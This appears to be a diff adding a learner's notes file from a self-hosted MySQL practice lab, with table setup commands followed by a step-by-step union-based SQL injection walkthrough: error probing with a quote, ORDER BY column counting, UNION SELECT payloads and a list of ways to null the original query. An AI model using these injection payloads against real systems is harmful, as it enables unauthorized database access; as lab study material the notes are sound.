@@ -1,0 +1,48 @@
+mysql-ctl cli
+
+show databases;
+use c9;
+
+database: c9
+table: pages
+    id      INT(6)
+    content VARCHAR(100)
+table: users
+    id       INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY
+    login    VARCHAR(30)
+    password VARCHAR(30)
+    
+show tables;
+INSERT INTO users VALUES (1, 'admin', '12345678');
+select * from users;
+DELETE FROM pages WHERE content = 'Contacts page';
+
+update pages set content='<style>body{background-color:blue;}</style>' where id=1;
+
+
+
+// Results
+1. id=1' ( Error, so can MYSQL injection )
+2. id=1 order by 3-- ( no error )
+   id=1 order by 4-- ( Error )
+   So in our table we have 3 columns
+3. Union select statement. It joins the previously running query to itself
+Usage: union select 1,2,3,... till no of columns
+In our case union select 1,2,3--
+its case insensitive
+our query is becoming: SELECT * FROM users WHERE id=1 union select 1,2,3--
+
+Page loads fine)
+and when union select is called we can should see some columns no. to execute MySQL queries
+for than we could False / NULL the query by negativing the value
+Our query: SELECT * FROM users WHERE id=-1 union select 1,2,3--
+Now we see column no. 2 . So username is storage at column 2
+other methods:
+- id=1 and 0
+- and false
+- and 1=2
+- and 0/0
+- having 1=2
+- 0
+- 9999999
+- null
